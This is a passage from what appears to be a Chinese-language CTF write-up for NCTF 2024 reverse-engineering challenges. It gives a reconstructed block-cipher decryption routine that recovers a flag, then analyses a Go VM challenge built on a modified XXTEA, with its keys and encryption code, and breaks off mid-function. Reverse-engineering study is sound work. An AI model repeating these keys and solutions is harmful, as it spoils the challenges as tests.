<span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>
<span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x48</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">unsigned</span> <span class="token keyword">int</span> dword_7FF699A4A040<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token number">0x00070E15</span><span class="token punctuation">,</span> <span class="token number">0x1C232A31</span><span class="token punctuation">,</span> <span class="token number">0x383F464D</span><span class="token punctuation">,</span> <span class="token number">0x545B6269</span><span class="token punctuation">,</span> <span class="token number">0x70777E85</span><span class="token punctuation">,</span> <span class="token number">0x8C939AA1</span><span class="token punctuation">,</span> <span class="token number">0xA8AFB6BD</span><span class="token punctuation">,</span> <span class="token number">0xC4CBD2D9</span><span class="token punctuation">,</span>
<span class="token number">0xE0E7EEF5</span><span class="token punctuation">,</span> <span class="token number">0xFC030A11</span><span class="token punctuation">,</span> <span class="token number">0x181F262D</span><span class="token punctuation">,</span> <span class="token number">0x343B4249</span><span class="token punctuation">,</span> <span class="token number">0x50575E65</span><span class="token punctuation">,</span> <span class="token number">0x6C737A81</span><span class="token punctuation">,</span> <span class="token number">0x888F969D</span><span class="token punctuation">,</span> <span class="token number">0xA4ABB2B9</span><span class="token punctuation">,</span>
<span class="token number">0xC0C7CED5</span><span class="token punctuation">,</span> <span class="token number">0xDCE3EAF1</span><span class="token punctuation">,</span> <span class="token number">0xF8FF060D</span><span class="token punctuation">,</span> <span class="token number">0x141B2229</span><span class="token punctuation">,</span> <span class="token number">0x30373E45</span><span class="token punctuation">,</span> <span class="token number">0x4C535A61</span><span class="token punctuation">,</span> <span class="token number">0x686F767D</span><span class="token punctuation">,</span> <span class="token number">0x848B9299</span><span class="token punctuation">,</span>
<span class="token number">0xA0A7AEB5</span><span class="token punctuation">,</span> <span class="token number">0xBCC3CAD1</span><span class="token punctuation">,</span> <span class="token number">0xD8DFE6ED</span><span class="token punctuation">,</span> <span class="token number">0xF4FB0209</span><span class="token punctuation">,</span> <span class="token number">0x10171E25</span><span class="token punctuation">,</span> <span class="token number">0x2C333A41</span><span class="token punctuation">,</span> <span class="token number">0x484F565D</span><span class="token punctuation">,</span> <span class="token number">0x646B7279</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> dword_7FF699A4A028<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token number">0xA3B1BAC6</span><span class="token punctuation">,</span> <span class="token number">0x56AA3350</span><span class="token punctuation">,</span> <span class="token number">0x677D9197</span><span class="token punctuation">,</span> <span class="token number">0xB27022DC</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">uint32_t</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token generic-function"><span class="token function">x</span> <span class="token generic class-name"><span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>x <span class="token operator">>></span></span></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">generate_buf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> key<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">uint32_t</span> key_dword<span class="token punctuation">;</span>
            <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>key_dword<span class="token punctuation">,</span> key <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">uint32_t</span> converted_key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">&amp;</span> <span class="token number">0xFF00</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF00</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dword_7FF699A4A028<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> converted_key<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">uint32_t</span> v12 <span class="token operator">=</span> dword_7FF699A4A040<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">uint8_t</span><span class="token operator">*</span> v12_bytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    v12_bytes<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> byte_7FF699A4A0D0<span class="token punctuation">[</span>v12_bytes<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">uint32_t</span> rot1 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot2 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>rot1 <span class="token operator">^</span> rot2 <span class="token operator">^</span> v12<span class="token punctuation">)</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> key<span class="token punctuation">,</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> plaintext<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> buf<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> buf_1<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">generate_buf</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> ii<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">uint32_t</span> cipher_dword<span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cipher_dword<span class="token punctuation">,</span> ciphertext <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> ii<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        buf_1<span class="token punctuation">[</span><span class="token number">35</span> <span class="token operator">-</span> ii<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF00</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF0000</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> m<span class="token operator">--</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">uint32_t</span> v12_0 <span class="token operator">=</span> buf<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span><span class="token operator">*</span> v12_bytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12_0<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            v12_bytes<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> byte_7FF699A4A0D0<span class="token punctuation">[</span>v12_bytes<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">uint32_t</span> rot1 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot2 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot3 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot4 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> L_result <span class="token operator">=</span> rot1 <span class="token operator">^</span> rot2 <span class="token operator">^</span> rot3 <span class="token operator">^</span> rot4 <span class="token operator">^</span> v12_0<span class="token punctuation">;</span>
        buf_1<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^</span> L_result<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">uint32_t</span> v11 <span class="token operator">=</span> buf_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b0 <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b1 <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b2 <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b3 <span class="token operator">=</span> v11 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> le <span class="token operator">=</span> <span class="token punctuation">(</span>b3 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> b0<span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>plaintext <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>le<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main_safe</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint8_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"NCTF24nctfNCTF24"</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span>
    <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x46</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token punctuation">,</span> key<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> flag<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NCTF&#123;%.32s&#125;\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p>
<p><img src="/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png" loading="lazy"></p>
<p>在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。</p>
<p><img src="/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png" loading="lazy"></p>
<p><img src="/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png" loading="lazy"></p>
<p>对每个vm的函数都下断点输出，如XOR这样：</p>
<p><img src="/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png" loading="lazy"></p>
<p><img src="/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png" loading="lazy"></p>
<p>运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p>
<p><img src="/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png" loading="lazy"></p>
<p><img src="/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png" loading="lazy"></p>
<p>通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p>
<p>还原加密代码如下，基于标准XXTEA进行修改的：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key2<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x6e637466</span><span class="token punctuation">,</span> <span class="token number">0x62ef0ed</span> <span class="token punctuation">,</span><span class="token number">0xa78c0b4f</span><span class="token punctuation">,</span> <span class="token number">0x32303234</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">uint32_t</span> key2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x32303234</span><span class="token punctuation">,</span> <span class="token number">0xd6eb12c3</span><span class="token punctuation">,</span> <span class="token number">0x9f1cf72e</span><span class="token punctuation">,</span> <span class="token number">0x4e435446</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_1</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_2</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
